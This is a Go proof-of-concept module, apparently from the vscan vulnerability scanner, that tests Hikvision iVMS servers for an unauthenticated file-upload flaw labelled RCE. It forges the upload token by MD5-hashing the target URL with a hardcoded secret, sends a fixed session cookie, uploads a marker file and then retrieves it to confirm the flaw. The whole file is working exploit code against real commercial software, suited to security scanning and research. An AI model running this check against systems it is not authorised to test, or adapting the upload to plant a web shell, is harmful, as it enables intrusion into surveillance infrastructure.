package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"github.com/veo/vscan/pocs_yml/utils"
	"regexp"
	"strings"
)

func Hikvision_iVMS_files_rce(u string) bool {

	var payload = "------WebKitFormBoundaryGEJwiloiPo\r\nContent-Disposition: form-data; name=\"fileUploader\";filename=\"1.txt\"\r\nContent-Type: image/jpeg\r\nea26cdac4990498b32d7a95ce5a5135c\r\n\r\nmBoundaryGEJwiloiPo\r\n------WebKitFormBoundaryGEJwiloiPo"
	token := u + "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
	var md5 = strings.ToUpper(utils.MD5(token))
	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundaryGEJwiloiPo"
	header["Cookie"] = "ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9"

	if req, err := pkg.HttpRequset(u+"/eps/api/resourceOperations/upload?token="+md5, "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)

		if req.StatusCode == 200 && strings.Contains(req.Body, "resourceUuid") {
			var pattern = `"resourceUuid":"([^"]*)"`
			re := regexp.MustCompile(pattern)
			resourceUuid := re.FindStringSubmatch(req.Body)[1]
			if req2, err := pkg.HttpRequset(u+"/eps/upload/"+resourceUuid+".txt", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req2.Body, "mBoundaryGEJwiloiPo") {
					pkg.GoPocLog(fmt.Sprintf("Found vuln Hikvision_iVMS_files_rce!!!|%s\n", u+"/eps/upload/"+resourceUuid+".txt"))
					return true
				}
			}
		}
	}
	return false
}
